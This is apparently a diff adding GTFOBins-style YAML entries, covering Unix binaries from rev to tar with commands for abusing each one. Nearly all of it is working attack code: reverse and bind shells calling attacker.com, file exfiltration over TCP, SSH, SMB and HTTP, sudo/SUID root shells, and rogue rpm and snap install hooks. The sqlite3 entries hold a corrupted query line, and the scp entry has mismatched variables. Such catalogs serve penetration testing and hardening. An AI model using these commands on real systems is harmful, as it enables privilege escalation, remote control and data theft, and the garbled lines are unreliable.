+- code: |
+LFILE=file_to_read
+./rev $LFILE | rev
+sudo:
+- code: |
+LFILE=file_to_read
+sudo rev $LFILE | rev
+---
+description: |
+Usually `rlogin` is a symlink to `ssh`, the following works only when the *real* `rlogin` is used (e.g., from the `rsh-client` APT package).
+functions:
+file-upload:
+- description: |
+Send contents of a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker system to capture the contents.
+
+`rlogin` hangs waiting for the remote peer to close the socket.
+
+The file is corrupted by leading and trailing spurious data.
+code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_send
+rlogin -l "$(cat $LFILE)" -p $RPORT $RHOST
+---
+functions:
+shell:
+- code: rlwrap /bin/sh
+file-write:
+- description: This adds timestamps to the output file. This relies on the external `echo` command.
+code: |
+LFILE=file_to_write
+rlwrap -l "$LFILE" echo DATA
+suid:
+- code: ./rlwrap -H /dev/null /bin/sh -p
+sudo:
+- code: sudo rlwrap /bin/sh
+---
+functions:
+shell:
+- code: rpm --eval '%{lua:os.execute("/bin/sh")}'
+- code: rpm --pipe '/bin/sh 0<&1'
+limited-suid:
+- code: ./rpm --eval '%{lua:os.execute("/bin/sh")}'
+sudo:
+- code: sudo rpm --eval '%{lua:os.execute("/bin/sh")}'
+- description: |
+It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
+```
+TF=$(mktemp -d)
+echo 'id' > $TF/x.sh
+fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
+```
+code: |
+sudo rpm -ivh x-1.0-1.noarch.rpm
+---
+functions:
+shell:
+- code: rpmdb --eval '%(/bin/sh 1>&2)'
+limited-suid:
+- code: ./rpmdb --eval '%(/bin/sh 1>&2)'
+sudo:
+- code: sudo rpmdb --eval '%(/bin/sh 1>&2)'
+---
+functions:
+shell:
+- code: rpmquery --eval '%{lua:posix.exec("/bin/sh")}'
+limited-suid:
+- code: ./rpmquery --eval '%{lua:os.execute("/bin/sh")}'
+sudo:
+- code: sudo rpmquery --eval '%{lua:posix.exec("/bin/sh")}'
+---
+functions:
+shell:
+- code: rpmverify --eval '%(/bin/sh 1>&2)'
+limited-suid:
+- code: ./rpmverify --eval '%(/bin/sh 1>&2)'
+sudo:
+- code: sudo rpmverify --eval '%(/bin/sh 1>&2)'
+---
+functions:
+shell:
+- code: rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+sudo:
+- code: sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+suid:
+- code: ./rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+---
+functions:
+shell:
+- code: ruby -e 'exec "/bin/sh"'
+reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+file-upload:
+- description: Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.
+code: |
+export LPORT=8888
+ruby -run -e httpd . -p $LPORT
+file-download:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+ruby -e 'require "open-uri"; download = open(ENV["URL"]); IO.copy_stream(download, ENV["LFILE"])'
+file-write:
+- code: ruby -e 'File.open("file_to_write", "w+") { |f| f.write("DATA") }'
+file-read:
+- code: ruby -e 'puts File.read("file_to_read")'
+library-load:
+- code: ruby -e 'require "fiddle"; Fiddle.dlopen("lib.so")'
+sudo:
+- code: sudo ruby -e 'exec "/bin/sh"'
+capabilities:
+- code: ./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
+---
+functions:
+shell:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+run-mailcap --action=view /etc/hosts
+!/bin/sh
+file-read:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: run-mailcap --action=view file_to_read
+file-write:
+- description: |
+The file must exist and be not empty.
+
+This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply.
+code: run-mailcap --action=edit file_to_read
+sudo:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+sudo run-mailcap --action=view /etc/hosts
+!/bin/sh
+---
+functions:
+shell:
+- code: run-parts --new-session --regex '^sh$' /bin
+sudo:
+- code: sudo run-parts --new-session --regex '^sh$' /bin
+suid:
+- code: ./run-parts --new-session --regex '^sh$' /bin --arg='-p'
+---
+functions:
+shell:
+- description: This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.
+code: rview -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+- description: This requires that `rview` is compiled with Lua support.
+code: rview -c ':lua os.execute("reset; exec sh")'
+reverse-shell:
+- description: This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+rview -c ':py import vim,sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")
+vim.command(":q!")'
+non-interactive-reverse-shell:
+- description: Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+rview -c ':lua local s=require("socket"); local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+while true do
+local r,x=t:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));t:send(b);
+end;
+f:close();t:close();'
+non-interactive-bind-shell:
+- description: Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export LPORT=12345
+rview -c ':lua local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+while true do
+local r,x=c:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));c:send(b);
+end;c:close();f:close();'
+file-upload:
+- description: This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
+code: |
+export URL=http://attacker.com/
+export LFILE=file_to_send
+rview -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
+vim.command(":q!")'
+- description: This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
+code: |
+export LPORT=8888
+rview -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
+vim.command(":q!")'
+- description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_send
+rview -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
+local d=f:read("*a")
+io.close(f);
+local s=require("socket");
+local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+t:send(d);
+t:close();'
+file-download:
+- description: This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+rview -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve(e["URL"], e["LFILE"])
+vim.command(":q!")'
+- description: Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export LPORT=12345
+export LFILE=file_to_save
+rview -c ':lua local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+local d,x=c:receive("*a");
+c:close();
+local f=io.open(os.getenv("LFILE"), "wb");
+f:write(d);
+io.close(f);'
+file-write:
+- code: |
+rview file_to_write
+iDATA
+^[
+w!
+file-read:
+- code: rview file_to_read
+library-load:
+- description: This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.
+code: rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
+suid:
+- description: This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.
+code: ./rview -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+sudo:
+- description: This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.
+code: sudo rview -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+- description: This requires that `rview` is compiled with Lua support.
+code: sudo rview -c ':lua os.execute("reset; exec sh")'
+capabilities:
+- description: This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.
+code: ./rview -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+limited-suid:
+- description: This requires that `rview` is compiled with Lua support.
+code: ./rview -c ':lua os.execute("reset; exec sh")'
+---
+functions:
+shell:
+- description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
+code: rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+- description: This requires that `rvim` is compiled with Lua support.
+code: rvim -c ':lua os.execute("reset; exec sh")'
+reverse-shell:
+- description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")
+vim.command(":q!")'
+non-interactive-reverse-shell:
+- description: Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+rvim -c ':lua local s=require("socket"); local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+while true do
+local r,x=t:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));t:send(b);
+end;
+f:close();t:close();'
+non-interactive-bind-shell:
+- description: Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export LPORT=12345
+rvim -c ':lua local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+while true do
+local r,x=c:receive();local f=assert(io.popen(r,"r"));
+local b=assert(f:read("*a"));c:send(b);
+end;c:close();f:close();'
+file-upload:
+- description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
+code: |
+export URL=http://attacker.com/
+export LFILE=file_to_send
+rvim -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
+vim.command(":q!")'
+- description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
+code: |
+export LPORT=8888
+rvim -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
+vim.command(":q!")'
+- description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_send
+rvim -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
+local d=f:read("*a")
+io.close(f);
+local s=require("socket");
+local t=assert(s.tcp());
+t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
+t:send(d);
+t:close();'
+file-download:
+- description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+rvim -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve(e["URL"], e["LFILE"])
+vim.command(":q!")'
+- description: Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.
+code: |
+export LPORT=12345
+export LFILE=file_to_save
+rvim -c ':lua local k=require("socket");
+local s=assert(k.bind("*",os.getenv("LPORT")));
+local c=s:accept();
+local d,x=c:receive("*a");
+c:close();
+local f=io.open(os.getenv("LFILE"), "wb");
+f:write(d);
+io.close(f);'
+file-write:
+- code: |
+rvim file_to_write
+iDATA
+^[
+w
+file-read:
+- code: rvim file_to_read
+library-load:
+- description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
+code: rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
+suid:
+- description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
+code: ./rvim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+sudo:
+- description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
+code: sudo rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+- description: This requires that `rvim` is compiled with Lua support.
+code: sudo rvim -c ':lua os.execute("reset; exec sh")'
+capabilities:
+- description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
+code: ./rvim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+limited-suid:
+- description: This requires that `rvim` is compiled with Lua support.
+code: ./rvim -c ':lua os.execute("reset; exec sh")'
+---
+functions:
+shell:
+- code: sash
+suid:
+- code: ./sash
+sudo:
+- code: sudo sash
+---
+functions:
+shell:
+- code: |
+scanmem
+shell /bin/sh
+suid:
+- code: |
+./scanmem
+shell /bin/sh
+sudo:
+- code: |
+sudo scanmem
+shell /bin/sh
+---
+functions:
+shell:
+- code: |
+TF=$(mktemp)
+echo 'sh 0<&2 1>&2' > $TF
+chmod +x "$TF"
+scp -S $TF x y:
+file-upload:
+- description: Send local file to a SSH server.
+code: |
+RPATH=user@attacker.com:~/file_to_save
+LPATH=file_to_send
+scp $LFILE $RPATH
+file-download:
+- description: Fetch a remote file from a SSH server.
+code: |
+RPATH=user@attacker.com:~/file_to_get
+LFILE=file_to_save
+scp $RPATH $LFILE
+sudo:
+- code: |
+TF=$(mktemp)
+echo 'sh 0<&2 1>&2' > $TF
+chmod +x "$TF"
+sudo scp -S $TF x y:
+limited-suid:
+- code: |
+TF=$(mktemp)
+echo 'sh 0<&2 1>&2' > $TF
+chmod +x "$TF"
+./scp -S $TF a b:
+---
+functions:
+shell:
+- code: screen
+file-write:
+- description: This works on screen version 4.06.02. Data is appended to the file and `
+` is converted to `
+`.
+code: |
+LFILE=file_to_write
+screen -L -Logfile $LFILE echo DATA
+- description: This works on screen version 4.05.00. Data is appended to the file and `
+` is converted to `
+`.
+code: |
+LFILE=file_to_write
+screen -L $LFILE echo DATA
+sudo:
+- code: sudo screen
+---
+functions:
+shell:
+- code: script -q /dev/null
+sudo:
+- code: sudo script -q /dev/null
+file-write:
+- description: The wrote content is corrupted by debug prints.
+code: script -q -c 'echo DATA' file_to_write
+---
+description: This requires a running X server.
+functions:
+shell:
+- code: scrot -e /bin/sh
+limited-suid:
+- code: ./scrot -e /bin/sh
+sudo:
+- code: sudo scrot -e /bin/sh
+---
+functions:
+shell:
+- description: GNU version only. Also, this requires `bash`.
+code: sed -n '1e exec sh 1>&0' /etc/hosts
+- description: GNU version only. The resulting shell is not a proper TTY shell.
+code: sed e
+command:
+- description: GNU version only.
+code: sed -n '1e id' /etc/hosts
+file-write:
+- code: |
+LFILE=file_to_write
+sed -n "1s/.*/DATA/w $LFILE" /etc/hosts
+file-read:
+- code: |
+LFILE=file_to_read
+sed '' "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./sed -e '' "$LFILE"
+sudo:
+- description: GNU version only. Also, this requires `bash`.
+code: sudo sed -n '1e exec sh 1>&0' /etc/hosts
+---
+functions:
+shell:
+- code: /usr/sbin/service ../../bin/sh
+sudo:
+- code: sudo service ../../bin/sh
+---
+functions:
+shell:
+- code: setarch $(arch) /bin/sh
+suid:
+- code: ./setarch $(arch) /bin/sh -p
+sudo:
+- code: sudo setarch $(arch) /bin/sh
+---
+description: This can be run with elevated privileges to change ownership and then read, write, or execute a file.
+functions:
+suid:
+- code: |
+LFILE=file_to_change
+USER=somebody
+./setfacl -m u:$USER:rwx $LFILE
+sudo:
+- code: |
+LFILE=file_to_change
+USER=somebody
+sudo setfacl -m -u:$USER:rwx $LFILE
+---
+functions:
+shell:
+- code: |
+HOST=user@attacker.com
+sftp $HOST
+!/bin/sh
+file-upload:
+- description: Send local file to a SSH server.
+code: |
+RHOST=user@attacker.com
+sftp $RHOST
+put file_to_send file_to_save
+file-download:
+- description: Fetch a remote file from a SSH server.
+code: |
+RHOST=user@attacker.com
+sftp $RHOST
+get file_to_get file_to_save
+sudo:
+- code: |
+HOST=user@attacker.com
+sudo sftp $HOST
+!/bin/sh
+---
+functions:
+shell:
+- description: Commands can be run if the current user's group is specified, therefore no additional permissions are needed.
+code: |
+sg $(id -ng)
+sudo:
+- code: |
+sudo sg root
+---
+functions:
+file-read:
+- description: The read file content is corrupted by randomizing the order of NUL terminated strings.
+code: |
+LFILE=file_to_read
+shuf -z "$LFILE"
+file-write:
+- description: The written file content is corrupted by adding a newline.
+code: |
+LFILE=file_to_write
+shuf -e DATA -o "$LFILE"
+suid:
+- description: The written file content is corrupted by adding a newline.
+code: |
+LFILE=file_to_write
+./shuf -e DATA -o "$LFILE"
+sudo:
+- description: The written file content is corrupted by adding a newline.
+code: |
+LFILE=file_to_write
+sudo shuf -e DATA -o "$LFILE"
+---
+functions:
+shell:
+- code: slsh -e 'system("/bin/sh")'
+sudo:
+- code: sudo slsh -e 'system("/bin/sh")'
+limited-suid:
+- code: ./slsh -e 'system("/bin/sh")'
+---
+description: A valid SMB/CIFS server must be available.
+functions:
+shell:
+- code: |
+smbclient '\attacker\share'
+!/bin/sh
+file-upload:
+- description: Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.
+code: |
+smbclient '\attacker\share' -c 'put file_to_send where_to_save'
+file-download:
+- description: Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file.
+code: |
+smbclient '\attacker\share' -c 'put file_to_send where_to_save'
+sudo:
+- code: |
+sudo smbclient '\attacker\share'
+!/bin/sh
+---
+functions:
+sudo:
+- description: |
+It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
+```
+COMMAND=id
+cd $(mktemp -d)
+mkdir -p meta/hooks
+printf '#!/bin/sh
+%s; false' "$COMMAND" >meta/hooks/install
+chmod +x meta/hooks/install
+fpm -n xxxx -s dir -t snap -a all meta
+```
+code: |
+sudo snap install xxxx_1.0_all.snap --dangerous --devmode
+---
+functions:
+shell:
+- description: The resulting shell is not a proper TTY shell and lacks the prompt.
+code: |
+socat stdin exec:/bin/sh
+reverse-shell:
+- description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
+code: |
+RHOST=attacker.com
+RPORT=12345
+socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
+bind-shell:
+- description: Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell.
+code: |
+LPORT=12345
+socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
+file-upload:
+- description: Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file.
+code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_send
+socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
+file-download:
+- description: Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.
+code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_save
+socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
+file-read:
+- code: |
+LFILE=file_to_read
+socat -u "file:$LFILE" -
+file-write:
+- code: |
+LFILE=file_to_write
+socat -u 'exec:echo DATA' "open:$LFILE,creat"
+sudo:
+- description: The resulting shell is not a proper TTY shell and lacks the prompt.
+code: |
+sudo socat stdin exec:/bin/sh
+limited-suid:
+- description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
+code: |
+RHOST=attacker.com
+RPORT=12345
+./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
+---
+description: The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+soelim "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./soelim "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo soelim "$LFILE"
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+sort -m "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./sort -m "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo sort -m "$LFILE"
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+TF=$(mktemp)
+split $LFILE $TF
+cat $TF*
+file-write:
+- description: Data will be written in the current directory in a file named `xaa` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.
+code: |
+TF=$(mktemp)
+echo DATA >$TF
+split -b999m $TF
+- description: GNU version only. Data will be written in the current directory in a file named `xaa.xxx` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.
+code: |
+EXT=.xxx
+TF=$(mktemp)
+echo DATA >$TF
+split -b999m --additional-suffix $EXTENSION $TF
+command:
+- description: Command execution using an existing or newly created file.
+code: |
+COMMAND=id
+TF=$(mktemp)
+split --filter=$COMMAND $TF
+- description: Command execution using stdin (and close it directly).
+code: |
+COMMAND=id
+echo | split --filter=$COMMAND /dev/stdin
+shell:
+- description: The shell prompt is not printed.
+code: |
+split --filter=/bin/sh /dev/stdin
+sudo:
+- description: The shell prompt is not printed.
+code: |
+sudo split --filter=/bin/sh /dev/stdin
+---
+functions:
+shell:
+- code: sqlite3 /dev/null '.shell /bin/sh'
+file-write:
+- code: |
+LFILE=file_to_write
+sqlite3 /dev/null -cmd ".output $LFILE" 'select "DATA";'
+file-read:
+- code: |
+LFILE=file_to_read
+sqlite3 << EOF
+CREATE TABLE t(line TEXT);
+.import $LFILE t
+SELECT methods tryforprivauto.sh FROM t;
+EOF
+suid:
+- code: |
+LFILE=file_to_read
+sqlite3 << EOF
+CREATE TABLE t(line TEXT);
+.import $LFILE t
+SELECT methods tryforprivauto.sh FROM t;
+EOF
+sudo:
+- code: sudo sqlite3 /dev/null '.shell /bin/sh'
+limited-suid:
+- code: "./sqlite3 /dev/null '.shell /bin/sh'"
+---
+description: |
+The file content is actually parsed so only a part of the first line is returned as a part of an error message.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+ss -a -F $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./ss -a -F $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo ss -a -F $LFILE
+---
+functions:
+library-load:
+- description: |
+code: ssh-keygen -D ./lib.so
+sudo:
+- description: |
+code: sudo ssh-keygen -D ./lib.so
+suid:
+- description: |
+code: ./ssh-keygen -D ./lib.so
+---
+description: |
+The file content is actually parsed so only a part of each line is returned as a part of an error message.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+ssh-keyscan -f $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./ssh-keyscan -f $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo ssh-keyscan -f $LFILE
+---
+functions:
+shell:
+- description: Reconnecting may help bypassing restricted shells.
+code: ssh localhost $SHELL --noprofile --norc
+- description: Spawn interactive shell through ProxyCommand option.
+code: ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+- description: Spawn interactive shell on client, requires a successful connection towards `host`.
+code: ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host
+file-upload:
+- description: Send local file to a SSH server.
+code: |
+HOST=user@attacker.com
+RPATH=file_to_save
+LPATH=file_to_send
+ssh $HOST "cat > $RPATH" < $LPATH
+file-download:
+- description: Fetch a remote file from a SSH server.
+code: |
+HOST=user@attacker.com
+RPATH=file_to_get
+LPATH=file_to_save
+ssh $HOST "cat $RPATH" > $LPATH
+file-read:
+- description: The read file content is corrupted by error prints.
+code: |
+LFILE=file_to_read
+ssh -F $LFILE localhost
+sudo:
+- description: Spawn interactive root shell through ProxyCommand option.
+code: sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+---
+functions:
+shell:
+- code: sshpass /bin/sh
+suid:
+- code: ./sshpass /bin/sh -p
+sudo:
+- code: sudo sshpass /bin/sh
+---
+functions:
+shell:
+- code: start-stop-daemon -n $RANDOM -S -x /bin/sh
+suid:
+- code: ./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
+sudo:
+- code: sudo start-stop-daemon -n $RANDOM -S -x /bin/sh
+---
+functions:
+shell:
+- code: stdbuf -i0 /bin/sh
+suid:
+- code: ./stdbuf -i0 /bin/sh -p
+sudo:
+- code: sudo stdbuf -i0 /bin/sh
+---
+functions:
+file-write:
+- description: The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`.
+code: |
+LFILE=file_to_write
+strace -s 999 -o $LFILE strace - DATA
+shell:
+- code: strace -o /dev/null /bin/sh
+suid:
+- code: ./strace -o /dev/null /bin/sh -p
+sudo:
+- code: sudo strace -o /dev/null /bin/sh
+---
+description: This only returns ASCII strings, thus it is not suitable for binary files.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+strings "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./strings "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo strings "$LFILE"
+---
+functions:
+sudo:
+- code: sudo su
+---
+description: The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+/usr/sbin/sysctl -n "/../../$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./sysctl -n "/../../$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo sysctl -n "/../../$LFILE"
+---
+functions:
+suid:
+- code: |
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+sudo:
+- code: |
+TF=$(mktemp)
+echo /bin/sh >$TF
+chmod +x $TF
+sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
+- code: |
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+sudo systemctl link $TF
+sudo systemctl enable --now $TF
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+sudo systemctl
+!sh
+---
+functions:
+sudo:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+sudo systemd-resolve --status
+!sh
+---
+description: Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+tac -s 'RANDOM' "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./tac -s 'RANDOM' "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo tac -s 'RANDOM' "$LFILE"
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+tail -c1G "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./tail -c1G "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo tail -c1G "$LFILE"
+---
+functions:
+shell:
+- code: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+- description: This only works for GNU tar.
+code: tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
+- description: This only works for GNU tar. It can be useful when only a limited command argument injection is available.
+code: |
+TF=$(mktemp)
+echo '/bin/sh 0<&1' > "$TF"
+tar cf "$TF.tar" "$TF"
+tar xf "$TF.tar" --to-command sh
+rm "$TF"*
+file-upload:
